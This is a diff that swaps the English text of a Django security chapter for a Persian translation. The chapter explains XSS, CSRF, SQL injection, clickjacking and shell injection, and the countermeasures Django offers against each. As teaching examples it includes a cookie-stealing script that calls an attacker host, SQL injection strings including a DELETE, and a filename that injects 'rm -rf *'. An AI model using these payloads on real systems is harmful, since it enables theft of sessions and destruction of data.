@@ -1,50 +1,48 @@
-# Security
+# امنیت
+در این فصل ما در باره موضوعات زیر بحث میکنیم:
 
-In this chapter, we will discuss the following topics:
-- Various web attacks and countermeasures
-- Where Django can and cannot help
-- Security checks for Django applications
+- انواع حملات وب و اقدامات متقابل
+- کجا جنگو میتواند و کجا نمیتواند کمک کند
+- بررسی های امنیتی برای برنامه های جنگو
 
-Several prominent industry reports suggest that websites and web applications remain one
-of the primary targets of cyber attacks. Yet, about 86 percent of all websites, tested by a
-leading security firm in 2013, had at least one serious vulnerability.
+گزارشات صنعتی متعددی نشان میدهد که وبسایت ها و برنامه های کاربردی یکی از اولین اهداف حملات سایبری هستند
+با این حال، حدود 86 درصد از تمام وب‌سایت‌ها که توسط یک شرکت امنیتی پیشرو در سال 2013 آزمایش شدند، حداقل یک آسیب‌پذیری جدی داشتند.
+<span dir="rtl">
+(dos) انتشار برنامه مملو از خطرات متعددی است از افشای اطلاعات محرمانه تا حمله محروم سازی از سرویس
+رسانه های جریان اصلی، نقص های امنیتی را با تمرکز بر سوء استفاده ها،
+مانند Heartbleed، Cloudbleed، Superfish و POODLE عنوان می کنند،
+، که تأثیر نامطلوبی بر برنامه های کاربردی وب سایت مهم، مانند ایمیل و بانکداری دارند.
+اغلب از خود می پرسند که آیا www اکنون به معنای وب جهانی است یا غرب وحشی وحشی.</span>
 
-Releasing your application to the wild is fraught with several dangers ranging from the
-leaking of confidential information to denial-of-service attacks. Mainstream media
-headlines security flaws focusing on exploits, such as Heartbleed, Cloudbleed, Superfish,
-and POODLE, that have an adverse impact on critical website applications, such as email
-and banking. Indeed, one often wonders if WWW now means the World Wide Web or the
-Wild Wild West.
+یکی از بزرگترین نقاط فروش جنگو تمرکز قوی آن بر امنیت است.
+در این فصل، تکنیک‌های برتری را که مهاجمان استفاده می‌کنند، پوشش خواهیم داد.
+همانطور که به زودی در این فصل خواهیم دید، جنگو می تواند از شما در برابر اکثر آنها محافظت کند.
 
-One of the biggest selling points of Django is its strong focus on security. In this chapter, we
-will cover the top techniques that attackers use. As we will soon see in this chapter, Django
-can protect you from most of them out of the box.
-
-I believe that in order to protect your site from attackers, you will need to think like one. So,
-let's familiarize ourselves with the common attacks.
-
+من معتقدم که برای محافظت از سایت خود در برابر مهاجمان، باید مانند یک مهاجم فکر کنید.
+بنابراین، بیایید خود را با حملات رایج آشنا کنیم.
 
 ### Cross-site scripting
-**Cross-site scripting (XSS)**, considered the most prevalent web application security flaw
-today, enables an attacker to execute their malicious scripts (usually JavaScript) on web
-pages viewed by users. Typically, the server is tricked into serving their malicious content
-along with the trusted content.
 
-How does a malicious piece of code reach the server? The common means of entering
-external data into a website are as follows:
-- Form fields
+**Cross-site scripting (XSS)**, امروزه رایج ترین نقص امنیتی برنامه های وب در نظر گرفته می شود
+و مهاجم را قادر می سازد تا اسکریپت های مخرب خود (معمولاً جاوا اسکریپت) را در صفحات وب مشاهده شده توسط کاربران اجرا کند.
+به طور معمول، سرور فریب داده می شود تا محتوای مخرب خود را همراه با محتوای قابل اعتماد ارائه دهد.
+
+چگونه یک کد مخرب به سرور می رسد؟ وسیله رایج ورود
+ورود اطلاعات خارجی به سرور به شرح زیر است:
+
+- از فیلد ها
 - URLs
 - Redirects
-- External scripts such as Ads or Analytics
+  -Alnaytics اسکریپت های خارجی مثل تبلیغات و
 
-None of these can be entirely avoided. The real problem is when outside data gets used
-without being validated or sanitized (as shown in the following screenshot); never trust
-outside data:
+از هیچ یک از اینها را نمی توان به طور کامل اجتناب کرد. مشکل واقعی زمانی است که از داده های خارجی استفاده می شود
+بدون تایید یا پاکسازی (همانطور که در تصویر زیر نشان داده شده است)؛
+هرگز به داده های بیرونی اعتماد نکنید:
 
 ![image 01](1.jpg)
 
-For example, let's take a look at a piece of vulnerable code and how an XSS attack can be
-performed on it. It is strongly advised that you do not to use this code in any form:
+به عنوان مثال، بیایید نگاهی به یک کد آسیب پذیر بیندازیم و اینکه چگونه می توان
+یک حمله XSS را روی آن انجام داد. اکیداً توصیه می شود که از این کد به هیچ شکلی استفاده نکنید:
 
 ```python
 class XSSDemoView(View):
@@ -54,7 +52,7 @@ class XSSDemoView(View):
         if 'q' in request.GET:
             return HttpResponse("Searched for: {}".format(
                 request.GET['q']))
-                
+
         else:
             return HttpResponse("""<form method="get">
         <input type="text" name="q" placeholder="Search" value="">
@@ -62,447 +60,468 @@ class XSSDemoView(View):
         </form>""")
 ```
 
-The preceding code is a **View** class that shows a search form when accessed without any
-**GET** parameters. If the search form is submitted, it shows the **Search** string exactly as
-entered by the user in the form.
+<span dir="rtl">کد قبلی یک کلاس **View** است که در صورت دسترسی بدون هیچ پارامتر **GET**، فرم جستجو را نشان می دهد. </span>
+اگر فرم جستجو ارسال شود، رشته **جستجو** را دقیقاً همانطور که کاربر در فرم وارد کرده است نشان می دهد.
 
-Now, open this view in a dated browser (say, IE 8) and enter the following search term in
-the form and submit it:
+اکنون، این نمای را در یک مرورگر دارای تاریخ باز کنید (مثلاً IE 8) و عبارت جستجوی زیر را در فرم وارد کنید و آن را ارسال کنید:
 
 ```js
 <script>alert("pwned")</script>
 ```
 
-Unsurprisingly, the browser will show an alert box with the ominous message - pwned.
 
+<span dir="rtl">جای تعجب نیست که مرورگر یک جعبه هشدار با پیام شوم - pwned را نشان می دهد. </span>
 <pre>
-This attack fails in current browsers such as the latest Chrome, which will
-present the following error message in the console: Refused to execute a
-JavaScript script. The source code of script found within request.
+این حمله در مرورگرهای فعلی مانند آخرین کروم با شکست مواجه می‌شود، 
+که پیام خطای زیر را در کنسول نشان می‌دهد: از اجرای اسکریپت جاوا اسکریپت خودداری کرد. 
+. کد منبع اسکریپت در درخواست یافت شد.
 </pre>
 
-
-In case you are wondering what harm a simple alert message could cause, remember that
-any JavaScript code can be executed in the same manner. In the worst case, the user's
-cookies can be sent to a site controlled by the attacker by entering the following search
-term:
+اگر نمی‌دانید که یک پیام هشدار ساده چه آسیبی می‌تواند داشته باشد، به یاد داشته باشید که
+هر کد جاوا اسکریپت را می‌توان به همان شیوه اجرا کرد. در بدترین حالت، کوکی های
+کاربر را می توان با وارد کردن عبارت جستجوی زیر به سایتی که توسط مهاجم کنترل می شود ارسال کرد:
 
 ```js
-<script>var adr = 'http://lair.com/evil.php?stolen=' +
-escape(document.cookie);</script>
+<script>
+  var adr = 'http://lair.com/evil.php?stolen=' + escape(document.cookie);
+</script>
 ```
 
-Once your cookies are sent, the attacker might be able to conduct a more serious attack.
+پس از ارسال کوکی‌های شما، مهاجم ممکن است بتواند حمله جدی‌تری انجام دهد.
 
+### چرا کوکی های شما ارزشمند است؟
 
-### Why are your cookies valuable?
-It might be worth understanding why cookies are the target of several attacks. Simply put,
-access to cookies allows attackers to impersonate you and even take control of your web
-account.
+شاید ارزش درک این را داشته باشد که چرا کوکی ها هدف چندین حمله هستند.
+به زبان ساده، دسترسی به کوکی‌ها به مهاجمان اجازه می‌دهد که شما را جعل کنند و
+حتی کنترل حساب وب شما را در دست بگیرند.
 
-To understand this in detail, you need to understand the concept of **sessions**. HTTP is
-stateless. Be it an anonymous or an authenticated user, Django keeps track of their activities
-for a certain duration of time by managing sessions.
+<span dir="rtl">برای درک دقیق این موضوع، باید مفهوم **sessions** را درک کنید.HTTP بدون تابعیت است </span>
+<span dir="rtl">این بدان معناست که هر درخواست HTTP که سرور دریافت می‌کند مستقل است و به درخواست‌هایی که قبل از آن ارائه شده‌اند مربوط نمی‌شود. </span>
+جنگو چه یک کاربر ناشناس یا یک کاربر تأیید شده باشد، با مدیریت جلسات، فعالیت های آنها را برای مدت زمان مشخصی پیگیری می کند.
 
-A session consists of a session ID at the client end, that is, the browser and a dictionary-like
-object stored at the server end. The session ID is a random 32-character string that is stored
-as a cookie in the browser. Each time a user makes a request to a website, all their cookies,
-including this session ID, are sent along with the request.
+یک جلسه شامل شناسه جلسه در انتهای کلاینت، یعنی مرورگر و یک شی دیکشنری مانند است که در انتهای سرور ذخیره می شود.
+شناسه جلسه یک رشته تصادفی 32 نویسه ای است که به عنوان یک کوکی در مرورگر ذخیره می شود. هر بار که یک کاربر از
+یک وب سایت درخواستی می کند، تمام کوکی های او، از جمله این شناسه جلسه، همراه با درخواست ارسال می شود.
 
-At the server end, Django maintains a session store that maps this session ID to the session
-data. By default, Django stores the session data in the **django_session** database table.
+<span dir="rtl">در انتهای سرور، جنگو یک ذخیره‌سازی جلسه دارد که این شناسه جلسه را به داده‌های جلسه نگاشت می‌کند. به 
+طور پیش فرض، جنگو داده های جلسه را در جدول پایگاه داده **django_session** ذخیره می کند. </span>
 
-Once a user successfully logs in, the session will note that the authentication was successful
-and will keep track of the user. Therefore, the cookie becomes a temporary user
-authentication for subsequent transactions. Anyone who acquires this cookie can use this
-web application as that user, which is called session hijacking.
+هنگامی که کاربر با موفقیت وارد سیستم می شود، جلسه متوجه می شود که احراز هویت موفقیت آمیز بوده و
+کاربر را پیگیری می کند. بنابراین، کوکی به یک تأیید هویت موقت کاربر برای تراکنش‌های بعدی تبدیل می‌شود.
+<span dir="rtl">هر کسی که این کوکی را بدست آورد می تواند از این برنامه وب به عنوان آن کاربر استفاده کند که به آن Session Hijacking می گویند. </span>
 
+### جچکو چگونه کمک میکند؟
 
-### How Django helps
-You might have observed that my example was an extremely unusual way of
-implementing a view in Django for two reasons: it did not use templates for rendering, and
-form classes were not used. Both of them have XSS-prevention measures.
+شاید مشاهده کرده باشید که مثال من به دو دلیل روشی بسیار غیرمعمول برای
+<span dir="rtl">پیاده سازی view در جنگو بود: از الگوها برای رندر استفاده نمی کرد و کلاس های فرم استفاده نمی شد. </span>
+<span dir="rtl">هر دوی آنها اقدامات پیشگیری XSS را دارند. </span>
+<span dir="rtl">
+به‌طور پیش‌فرض، جنگو الگوهای فرار خودکار نویسه‌های ویژه HTML را ایجاد می‌کند.
+بنابراین، اگر رشته جستجو را در قالب نمایش داده بودید، همه تگ ها با کد HTML بودند.
+این کار تزریق اسکریپت‌ها را غیرممکن می‌کند، مگر اینکه صریحاً با علامت‌گذاری محتوا به‌عنوان امن، آنها را خاموش کنید.
+</span>
+<span dir="rtl">
+استفاده از کلاس‌های فرم در جنگو برای اعتبارسنجی و سالم‌سازی ورودی نیز یک اقدام متقابل بسیار مؤثر است.
+برای مثال، اگر برنامه شما به شناسه کارمند عددی نیاز دارد، از کلاس **IntegerField**
+به جای کلاس **CharField** مجاز تر استفاده کنید.
+</span>
+<span dir="rtl">
+در مثال ما، می‌توانیم از یک کلاس **RegexValidator** در فیلد عبارت جستجوی خود استفاده کنیم
+تا کاربر را به کاراکترهای الفبایی محدود کنیم و اجازه دهیم نمادهای نقطه‌گذاری توسط
+ماژول جستجوی شما شناسایی شوند. محدوده قابل قبول ورودی کاربر را تا حد امکان محدود کنید.
+</span>
+### جایی که جنگو ممکن است کمکی نکند
 
-By default, Django templates auto-escape HTML special characters. So, if you had
-displayed the search string in a template, all the tags would have been HTML encoded.
-This makes it impossible to inject scripts unless you explicitly turn them off by marking the
-content as safe.
+جنگو می تواند از طریق فرار خودکار در قالب ها از ۸۰ درصد حملات XSS جلوگیری کند. برای سناریوهای باقی مانده، باید مراقب باشید که وظایف زیر را انجام دهید:
 
-Using form classes in Django to validate and sanitize the input is also a very effective
-countermeasure. For example, if your application requires a numeric employee ID, then use
-an **IntegerField** class rather than the more permissive **CharField** class.
-
-In our example, we can use a **RegexValidator** class in our search-term field to restrict the
-user to alphanumeric characters and allow punctuation symbols recognized by your search
-module. Restrict the acceptable range of the user input as strictly as possible.
-
-
-### Where Django might not help
-Django can prevent 80 percent of XSS attacks through auto-escaping in templates. For the remaining scenarios, you must take care to do the following tasks:
 - Quote all HTML attributes, for example, replace `<a href={{link}}>` with `<a href="{{link}}">`
-- Escape dynamic data in CSS or JavaScript using **custom** methods
-- Validate all URLs, especially against unsafe protocols such as JavaScript
-- Avoid client-side XSS (also, known as DOM-based XSS)
-
-As a general rule against XSS, I suggest filter on input and escape on output. Make sure that
-you strictly validate and sanitize (filter) any data that comes in and transform (escape) it
-immediately before sending it to the user—specifically, if you need to support the user
-input with HTML formatting such as comments, consider using Markdown instead.
-
+- <span dir="rtl">فرار از داده های پویا در CSS یا جاوا اسکریپت با استفاده از روش های **سفارشی**</span>
+- اعتبارسنجی همه URL ها، به ویژه در برابر پروتکل های ناامن مانند جاوا اسکریپت
+- <span dir="rtl">اجتناب از XSS سمت کاربر (همچنین به عنوان XSS مبتنی بر DOM شناخته می شود)</span>
+<span dir="rtl">
+به عنوان یک قانون کلی در برابر XSS، من فیلتر در ورودی و معادل سازی خروجی(output escaping) را پیشنهاد می‌کنم.
+اطمینان حاصل کنید که هر داده‌ای را که وارد می‌شود کاملاً اعتبارسنجی و پاکسازی (فیلتر) شده باشد و بلافاصله قبل از ارسال آن
+به کاربر، آن‌ها را تبدیل (output escaping) می‌کنید—مخصوصاً، اگر نیاز به پشتیبانی از ورودی کاربر با قالب‌بندی HTML
+مانند نظرات دارید، از Markdown استفاده کنید.
+</span>
 <pre>
-Filter on input and escape on output.
+فیلتر کردن ورودی ها و معادل سازی خروجی ها
 </pre>
 
+### جعل های درخواست بین سایتی(Cross-site request forgery)
 
-### Cross-site request forgery
-**Cross-site request forgery (CSRF)** is an attack that tricks a user into making unwanted
-actions on a website, where they are already authenticated, while they are visiting another
-site. Say, in a forum, an attacker can place an IMG or IFRAME tag within the page that
-makes a carefully crafted request to the authenticated site.
+**جعل های درخواست بین سایتی (CSRF)** حمله ای است که کاربر را فریب می دهد تا در حالی که از سایت دیگری بازدید می کند،
+اقدامات ناخواسته ای را در یک وب سایت انجام دهد، جایی که قبلاً احراز هویت شده اند.
+مثلاً در یک فرم، یک مهاجم می‌تواند یک تگ IMG یا IFRAME را در صفحه قرار دهد
+که درخواستی را که به دقت طراحی شده است به سایت تأیید شده ارسال می‌کند.
 
-For instance, the following fake 0x0 image can be embedded in a comment:
+به عنوان مثال، تصویر جعلی0\*0 زیر را می توان در یک کامنت جاسازی کرد:
 
 ```html
-<img src="http://superbook.com/post?message=I+am+a+Dufus" width="0" height="0" border="0">
+<img
+  src="http://superbook.com/post?message=I+am+a+Dufus"
+  width="0"
+  height="0"
+  border="0"
+/>
 ```
+<span dir="rtl">
+اگر قبلاً از برگه دیگری وارد SuperBook شده اید، و اگر
+سایت اقدامات متقابل CSRF نداشته باشد، پیام بسیار شرم آور پست می شود.
+به عبارت دیگر، CSRF به مهاجم اجازه می دهد تا با فرض هویت شما اقداماتی را انجام دهد.
+</span>
+### جنگو چگونه کمک میکند
+<span dir="rtl">
+حفاظت اولیه در برابر CSRF استفاده از HTTP **POST** یا **PUT** و **DELETE**، (در صورت پشتیبانی) برای هر
+اقدامی است که دارای عوارض جانبی است. هر درخواست) GET یا( HEAD باید برای بازیابی اطلاعات استفاده شود، به عنوان
+مثال، فقط خواندنی.
+</span>
+<span dir="rtl">
+جنگو اقدامات متقابلی را علیه روش‌های **POST**، **PUT** یا **DELETE** با جاسازی یک توکن ارائه می‌کند.
+شما باید قبلاً با **{% csrf_token %}** ذکر شده در هر قالب فرم جنگو آشنا باشید.
+این به یک مقدار تصادفی تبدیل می شود که باید هنگام ارسال فرم وجود داشته باشد.
+</span>
+روش کار به این صورت است که مهاجم نمی تواند توکن را در حین ایجاد درخواست در سایت تأیید شده شما حدس بزند
+. از آنجایی که توکن اجباری است و باید با مقدار ارائه شده در حین پخش فرم مطابقت داشته باشد،
+ارسال فرم با شکست مواجه می شود و حمله خنثی می شود.
 
-If you have already signed into SuperBook from another tab, and if the site doesn't have
-CSRF countermeasures, then a very embarrassing message will be posted. In other words,
-CSRF allows the attacker to perform actions by assuming your identity.
-
-
-### How Django helps
-
-The basic protection against CSRF is to use an HTTP **POST** (or **PUT** and **DELETE**, if
-supported) for any action that has side effects. Any GET (or HEAD) request must be used
-for information retrieval, for example, read-only.
-
-Django offers countermeasures against **POST**, **PUT**, or **DELETE** methods by embedding a
-token. You must already be familiar with the **{% csrf_token %}** mentioned inside each
-Django form template. This is rendered into a random value that must be present while
-submitting the form.
-
-The way this works is that the attacker will not be able to guess the token while crafting the
-request to your authenticated site. Since the token is mandatory and must match the value
-presented while displaying the form, the form submission fails and the attack is thwarted.
-
-### Where Django might not help
-Some people turn off CSRF checks in a view with the @csrf_exempt decorator, especially
-for AJAX form posts. This is not recommended unless you have carefully considered the
-security risks involved.
-
-
-### SQL injection
-SQL injection is the second most common vulnerability of web applications, after XSS. The
-attack involves entering malicious SQL code into a query that gets executed on the
-database. It could result in data theft, by dumping database content, or the destruction of
-data, say, by using the **DROP TABLE** command.
-
-If you are familiar with SQL, then you can understand the following piece of code; it looks
-up an email address based on the given **username**:
-
+### جایی که جنگو ممکن است کمکی نکند
+<span dir="rtl">
+برخی از افراد چک‌های CSRF را در view با دکوراتور @csrf_exempt خاموش می‌کنند،
+مخصوصاً برای پست‌های فرم AJAX. این توصیه نمی شود
+مگر اینکه خطرات امنیتی مربوطه را به دقت در نظر گرفته باشید.
+</span  >
+### تزریق SQL (SQL injection)
+<span dir="rtl">
+تزریق SQL دومین آسیب پذیری رایج برنامه های کاربردی وب پس از XSS است.
+این حمله شامل وارد کردن کد SQL مخرب در یک کوئری است که در پایگاه داده اجرا می شود.
+این می تواند منجر به سرقت داده ها، با ریختن محتوای پایگاه داده،
+یا تخریب داده ها، مثلاً با استفاده از دستور **DROP TABLE** شود.
+</span>
+<span dir="rtl">
+اگر با SQL آشنا هستید، می توانید کد زیر را درک کنید.
+یک آدرس ایمیل را بر اساس **نام کاربری** داده شده جستجو می کند:
+</span>
 ```python
 name = request.GET['user']
 
 sql = "SELECT email FROM users WHERE username = '{}';".format(name)
 ```
-
-At first glance, it might appear that only the email address corresponds to the **username**
-mentioned as the **GET** parameter will be returned. However, imagine if
-an attacker entered ' OR '1'='1' in the form field, then the SQL code would be as
-follows:
+<span dir="rtl">
+در نگاه اول، ممکن است به نظر برسد که فقط آدرس ایمیل مربوط به نام کاربری
+** که به عنوان پارامتر **GET\*\* ذکر شده است، بازگردانده خواهد شد.
+با این حال، تصور کنید اگر یک مهاجم 'OR'1'='1' را در قسمت فرم وارد کند،
+کد SQL به شکل زیر خواهد بود:
+</span>
 
 ```sql
 SELECT email FROM users WHERE username = '' OR '1'='1';
 ```
-
-Since this **WHERE** clause will always be true, the emails of all the users of your application
-will be returned. This can be a serious leak of confidential information.
-
-Again, if the attacker wishes, they could execute more dangerous queries like the following:
+<span dir="rtl">
+از آنجایی که این بند **WHERE** همیشه درست خواهد بود،
+ایمیل های همه کاربران برنامه شما برگردانده می شود.
+این می تواند یک نشت جدی اطلاعات محرمانه باشد.
+</span>
+مجدداً، اگر مهاجم بخواهد، می تواند پرس و جوهای خطرناک تری مانند موارد زیر را اجرا کند:
 
 ```sql
 SELECT email FROM users WHERE username = ''; DELETE FROM users WHERE '1'='1';
 ```
 
-Now, all the user entries will be wiped off your database!
+اکنون، تمام ورودی های کاربر از پایگاه داده شما پاک می شود!
 
-
-### How Django helps
-The countermeasure against an SQL injection is fairly simple. Use the Django ORM rather
-than crafting SQL statements by hand. The preceding example should be implemented as
-follows:
-
+### جنگو چگونه کمک میکند
+<span dir="rtl">
+اقدام متقابل در برابر تزریق SQL نسبتاً ساده است. از Django ORM به جای ساخت دستورات SQL به صورت مستقیم استفاده کنید.
+مثال قبل باید به صورت زیر پیاده سازی شود
+</span>
 ```python
 User.objects.get(username=name).email
 ```
+<span dir="rtl">
+در اینجا، درایورهای پایگاه داده جنگو به طور خودکار از پارامترها فرار می کنند.
+این اطمینان حاصل می کند که آنها به عنوان داده صرفاً در نظر گرفته می شوند و بنابراین بی ضرر هستند.
+با این حال، همانطور که به زودی خواهیم دید، حتی ORM دارای چندین مشکل است.
+</span>
+### جایی که جنگو ممکن است کمکی نکند
+<span dir="rtl">
+مثلاً به دلیل محدودیت‌های ORM جنگو، ممکن است مواردی وجود داشته باشد که افراد نیاز به استفاده از SQL خام داشته باشند.
+برای مثال با استافاده از متد **extra()** میتوانید از کد های sql خام استفاده کنید
+ولی ابن کد sql در مقابل SQL injections مقاوم نیست
+</span >
+<span dir="rtl">
+اگر از API سطح پایین ORM، مانند متد **execute()** استفاده می کنید، ممکن است
+بخواهید به جای درون یابی رشته SQL، پارامترهای bind را ارسال کنید.
+حتی در این صورت، اکیداً توصیه می‌شود که بررسی کنید که
+که آیا هر شناسه به درستی حذف شده است یا خیر.
+</span>
+<span dir="rtl">
+در نهایت، اگر از API پایگاه داده شخص ثالث مانند MongoDB استفاده می کنید،
+باید به صورت دستی تزریق SQL را بررسی کنید. در حالت ایده‌آل،
+شما می‌خواهید فقط از داده‌های کاملاً تمیز شده با چنین رابط‌هایی استفاده کنید.
+</span>
+### دزدی کلیک (Clickjacking)
 
-Here, Django's database drivers will automatically escape the parameters. This will ensure
-that they are treated as purely data and, therefore, they are harmless. However, as we will
-soon see, even the ORM has a few escape latches.
-
- 
-### Where Django might not help
-There could be instances where people would need to resort to raw SQL, say, due to
-limitations of the Django ORM. For example, the where clause of the **extra()** method of a
-QuerySet allows raw SQL. This SQL code will not be escaped against SQL injections.
-
-If you are using the low-level ORM API, such as the **execute()** method, then you might
-want to pass bind parameters instead of interpolating the SQL string yourself. Even then, it
-is strongly recommended that you check whether each identifier has been properly
-escaped.
-
-Finally, if you are using a third-party database API such as MongoDB, then you will need
-to manually check for SQL injections. Ideally, you would want to use only thoroughly
-sanitized data with such interfaces.
-
-
-### Clickjacking
-**Clickjacking** is a means of misleading a user to click on a hidden link or button in the
-browser when they were intending to click on something else.
- 
-This is typically implemented using an invisible IFRAME that contains the target website
-over a dummy web page (shown here) that the user is likely to click on:
-
+**Clickjacking** وسیله ای برای گمراه کردن کاربر برای کلیک بر روی پیوند یا دکمه مخفی
+در مرورگر زمانی که قصد کلیک روی چیز دیگری را دارد.
+<span dir="rtl">
+این معمولاً با استفاده از یک IFRAME نامرئی که حاوی وب سایت مورد نظر است، اجرا می شود
+روی یک صفحه وب ساختگی (در اینجا نشان داده شده است) که کاربر احتمالاً روی آن کلیک می کند:
+</span>
 ![image 02](2.jpg)
- 
-Since the action button in the invisible frame would be aligned exactly above the button in
-the dummy page, the user's click will perform an action on the target website instead.
 
- 
-### How Django helps
-Django protects your site from clickjacking using middleware that can be fine-tuned using
-several decorators. By default, this `django.middleware.clickjacking.XFrameOptionsMiddleware` middleware will be
-included in your **MIDDLEWARE_CLASSES** within your settings file. It works by setting the XFrame-Options header to **SAMEORIGIN** for every outgoing **HttpResponse**.
+از آنجایی که دکمه عمل در قاب نامرئی دقیقاً در بالای دکمه در صفحه ساختگی تراز شده است،
+کلیک کاربر به جای آن اقدامی را در وب سایت مورد نظر انجام می دهد.
 
-Most modern browsers recognize the header, which means that this page should not be
-inside a frame in other domains. The protection can be enabled and disabled for certain
-views using decorators, such as `@xframe_options_deny` and `@xframe_options_exempt`.
-
- 
-### Shell injection
-As the name suggests, shell injection or command injection allows an attacker to inject
-malicious code into a system shell such as bash. Even web applications use command-line
-programs for convenience and their functionality. Such processes are typically run within a
-shell.
-
-For example, if you want to show all the details of a file whose name is given by the user, a
-naïve implementation would be as follows:
+### جنگو چگونه کمک میکند
+<span dir="rtl">
+جنگو با استفاده از میان افزارهایی (middleware)که می توانند با استفاده از
+چندین دکوراتور به خوبی تنظیم شوند، از سایت شما در برابر کلیک جک محافظت می کند.
+به طور پیش‌فرض، این میان‌افزار «django.middleware.clickjacking.XFrameOptionsMiddleware» در
+**MIDDLEWARE_CLASSES** شما در فایل تنظیمات شما گنجانده می‌شود. با تنظیم هدر XFrame-Options
+روی **SAMEORIGIN** برای هر **HttpResponse** خروجی کار می کند.
+</span>
+<span dir="rtl">
+اکثر مرورگرهای مدرن هدر را تشخیص می دهند، به این معنی
+که این صفحه نباید در یک قاب در دامنه های دیگر باشد. حفاظت را می توان
+برای نماهای خاصی با استفاده از دکوراتورها، مانند `@xframe_options_deny` و
+`@xframe_options_exempt` فعال و غیرفعال کرد.
+</span>
+### تزریق دستورات سیستم عامل (Shell injection)
+<span dir="rtl">
+همانطور که از نام آن پیداست، تزریق shell یا تزریق فرمان به مهاجم اجازه می دهد
+تا کد مخرب را به shell سیستم مانند bash تزریق کند. حتی برنامه‌های کاربردی تحت وب
+نیز از برنامه‌های خط فرمان برای راحتی و عملکردشان استفاده می‌کنند.
+چنین فرآیندهایی معمولاً در یک shell اجرا می شوند.
+</span>
+به عنوان مثال، اگر می خواهید تمام جزئیات فایلی را که نام آن توسط کاربر داده شده است
+را نشان دهید، یک پیاده سازی ساده به صورت زیر خواهد بود:
 
 ```python
 os.system("ls -l {}".format(filename))
 ```
+<span dir="rtl">
+مهاجم می‌تواند نام فایل را به‌عنوان «manage.py» وارد کند. rm -rf \*`
+و تمام فایل های دایرکتوری خود را حذف کنید. به طور کلی
+استفاده از "os.system" توصیه نمی شود. ماژول subprocess جایگزین امن‌تری است (یا حتی بهتر است
+، ، می‌توانید از «os.stat()» برای دریافت ویژگی‌های فایل استفاده کنید).
+</span>
+<span dir="rtl">
+از آنجایی که یک shell آرگومان های خط فرمان و متغیرهای محیطی را تفسیر می کند،
+تنظیم مقادیر مخرب در آنها می تواند به مهاجم اجازه دهد تا دستورات سیستم دلخواه را اجرا کند.
+</span>
+### جنگو چگونه کمک میکند
+<span dir="rtl">
+جنگو در درجه اول برای استقرار به WSGI وابسته است. از آنجایی که WSGI،
+برخلاف CGI، بر روی متغیرهای محیطی (environment variables)بر اساس
+خود چارچوب در پیکربندی پیش‌فرض خود در برابر تزریق فرمان خط آسیب‌پذیر نیست.
+</span>
+<span dir="rtl">
+با این حال، اگر برنامه جنگو نیاز به اجرای سایر فایل های اجرایی داشته باشد،
+باید مراقب اجرای آن به صورت محدود، یعنی با حداقل مجوزها باشد.
+هر پارامتری که منشا خارجی دارد باید قبل از ارسال به چنین فایل های اجرایی آنیتیزه شود.
+علاوه بر این، از call() از ماژول subprocess برای اجرای برنامه‌های خط
+فرمان با پارامتر پیش‌فرض «shell=False» استفاده کنید تا اگر درون‌یابی فرمان خط لازم نباشد، آ
+آرگومان‌ها را به‌طور ایمن مدیریت کنید.
+</span>
+### و حملات وب پایان ناپذیر هستند
 
-An attacker can enter the filename as `manage.py; rm -rf *` and delete all the
-files in your directory. In general, it is not advisable to use `os.system`. The subprocess
-module is a safer alternative (or even better, you can use `os.stat()` to get the file's attributes).
+صدها تکنیک حمله وجود دارد که ما در اینجا به آنها اشاره نکرده‌ایم،
+، و با یافتن حملات جدید، فهرست هر روز بیشتر می‌شود.
+مهم است که خود را از آنها آگاه کنیم.
 
-Since a shell will interpret the command-line arguments and environment variables, setting
-malicious values in them can allow the attacker to execute arbitrary system commands.
+وبلاگ رسمی جنگو (https://www.djangoproject.com/weblog/) مکانی عالی
+برای اطلاع از آخرین اکسپلویت های کشف شده است. نگهبانان جنگو به طور فعال سعی می کنند
+با انتشار نسخه های امنیتی آنها را حل کنند. به شدت توصیه می شود که آنها را در اسرع وقت
+نصب کنید زیرا معمولاً نیاز به تغییر بسیار کمی در کد منبع شما دارند یا هیچ تغییری ندارند.
 
- 
-### How Django helps
-Django primarily depends on WSGI for deployment. Since WSGI, unlike CGI, does not set
-on environment variables based on the request, the framework itself is not vulnerable to
-shell injections in its default configuration.
+امنیت اپلیکیشن شما به اندازه ضعیف ترین لینک آن قوی است.
+حتی اگر کد جنگو شما کاملاً ایمن باشد، لایه‌ها و مؤلفه‌های زیادی در پشته شما وجود دارد،
+به غیر از عناصر انسانی، که می‌توان با تکنیک‌های مختلف مهندسی اجتماعی، مانند فیشینگ، آنها را فریب داد.
 
-However, if the Django application needs to run other executables, then care must be taken
-to run it in a restricted manner, that is, with least permissions. Any parameter originating
-externally must be sanitized before passing to such executables. Additionally, use call()
-from the subprocess module to run command-line programs with its default `shell=False`
-parameter to handle arguments securely if shell interpolation is not necessary.
- 
- 
-### And the web attacks are unending
-There are hundreds of attack techniques that we have not covered here, and the list keeps
-growing every day as new attacks are found. It is important to keep ourselves aware of
-them.
-
-Django's official blog (https://www.djangoproject.com/weblog/) is a great place to find
-out about the latest exploits that have been discovered. Django maintainers proactively try
-to resolve them by releasing security releases. It is highly recommended that you install
-them as quickly as possible since they usually need very little or no changes to your source
-code.
-
-The security of your application is only as strong as its weakest link. Even if your Django
-code might be completely secure, there are so many layers and components in your stack,
-not to mention human elements, who can also be tricked with various social engineering
-techniques, such as phishing.
-
-Vulnerabilities in one area, such as the OS, database, or web server, can be exploited to gain
-access to other parts of your system. Hence, it is best to have a holistic view of your stack
-rather than view each part separately.
-
+آسیب پذیری ها در یک منطقه، مانند سیستم عامل، پایگاه داده یا وب سرور
+، می توانند برای دسترسی به سایر بخش های سیستم مورد سوء استفاده قرار گیرند.
+از این رو، بهتر است به جای مشاهده جداگانه هر قسمت، یک دید کلی از پشته خود داشته باشید.
 
 <pre>
-    **The safe room**
-    As soon as Steve stepped outside the boardroom, he took out his phone
-    and thumbed a crisp one-liner e-mail to his team: "It's a go!"
+    **اتاق امن**
+به محض اینکه استیو از اتاق هیئت مدیره خارج شد، تلفن خود را بیرون آورد و 
+یک ایمیل تک خطی واضح را به تیمش ارسال کرد: "این کار است!"
+
+در 60 دقیقه اخر او توسط پرسش های جزعی رعیس درباره کوچک 
+ترین نکات اجرای برنامه به چالش کشیده شد. 
+خانم اُ، با ناراحتی استیو، در تمام مدت سکوت خود را حفظ کرد.
     
-    In the last 60 minutes, he had been grilled by the directors on every
-    possible detail of the launch. Madam O, to Steve's annoyance, maintained
-    her stoic silence the entire time.
+وارد کابینش شد و یک بار دیگر پرینت اسلایدهایش را باز کرد. پس از معرفی چک لیست ها، 
